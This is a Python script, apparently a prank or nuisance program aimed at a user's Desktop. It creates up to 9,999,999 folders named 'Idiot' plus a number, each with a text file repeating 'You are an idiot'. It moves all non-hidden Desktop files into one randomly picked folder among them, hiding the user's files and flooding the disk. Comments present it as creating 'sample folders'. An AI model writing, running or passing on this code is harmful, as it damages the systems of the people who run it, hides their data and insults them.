import os
import random
import shutil


def main():
    # === Settings ===
    num_folders = 9999999  # number of folders to make
    base_dir = os.path.expanduser("~/Desktop")  # your Desktop directory

    # === Step 1: Create sample folders one by one ===
    chosen_folder = None

    for i in range(1, num_folders + 1):
        folder_name = f"Idiot{i}"
        folder_path = os.path.join(base_dir, folder_name)
        os.makedirs(folder_path, exist_ok=True)

        # Create a text file inside
        txt_path = os.path.join(folder_path, f"{folder_name}.txt")
        with open(txt_path, "w") as f:
            f.write(f"You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot You are an idiot")


        # Random chance (e.g., 1 in remaining folders) to pick this as the random folder
        if chosen_folder is None and random.randint(1, num_folders - i + 1) == 1:
            chosen_folder = folder_path
            

            # === Step 2: Move all Desktop files right now ===
        

            for item in os.listdir(base_dir):
                item_path = os.path.join(base_dir, item)

                # Skip folders we just made
                if item.startswith("Idiot") and os.path.isdir(item_path):
                    continue

                # Skip hidden files
                if item.startswith('.'):
                    continue

                # Move file/folder
                try:
                    shutil.move(item_path, os.path.join(chosen_folder, item))
                except Exception as e:
                    continue

            

    # If none was randomly chosen during loop, pick last one by default
    if chosen_folder is None:
        chosen_folder = os.path.join(base_dir, f"sample{num_folders}")
        print(f"🎯 No random pick during loop. Default folder: {os.path.basename(chosen_folder)}")

if __name__ == "__main__":
    main()
